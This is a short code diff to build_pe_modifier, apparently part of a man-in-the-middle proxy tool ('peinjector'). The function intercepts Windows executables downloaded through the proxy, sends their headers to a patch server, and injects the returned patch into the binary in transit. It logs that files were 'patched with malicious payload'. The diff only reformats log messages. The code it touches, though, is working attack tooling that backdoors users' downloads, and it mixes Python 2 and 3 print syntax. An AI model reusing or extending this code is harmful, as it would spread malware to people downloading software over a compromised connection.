@@ -77,7 +77,7 @@ def build_pe_modifier(flow, patch_address, config):
 		for content in chunks:
 			# Only do this for 1. chunk, and quick PE check
 			if header and (content[:2] == 'MZ'): 
-				print("[+] Intercept PE, send header to server (" + str(len(content)) + " bytes)")
+				print("[+] Intercept PE, send header to server ({} bytes)".format(len(content)))
 				# If something goes wrong while network transmission
 				try:
 					# Open socket
@@ -88,10 +88,10 @@ def build_pe_modifier(flow, patch_address, config):
 						patch_mem = patch_socket.recv(max_patch)
 						# Close socket
 						patch_socket.close()
-						print("[+] Received patch: " + str(len(patch_mem)) + " bytes")
+						print("[+] Received patch: {} bytes".format(len(patch_mem)))
 						patcher = PePatch(patch_mem)
 						if patcher.patch_ok():
-							print("[+] Patch Ok")
+							print("[+] Patch parsed successfully")
 						else:
 							print("[-] Error parsing patch")
 							patcher = None
@@ -107,6 +107,7 @@ def build_pe_modifier(flow, patch_address, config):
 				position += len(content)
 
 			yield content
+			
 		if patcher is not None:
 			print "[peinjector] Patched '{}' with malicious payload".format(flow.request.url.split("/")[-1])
 
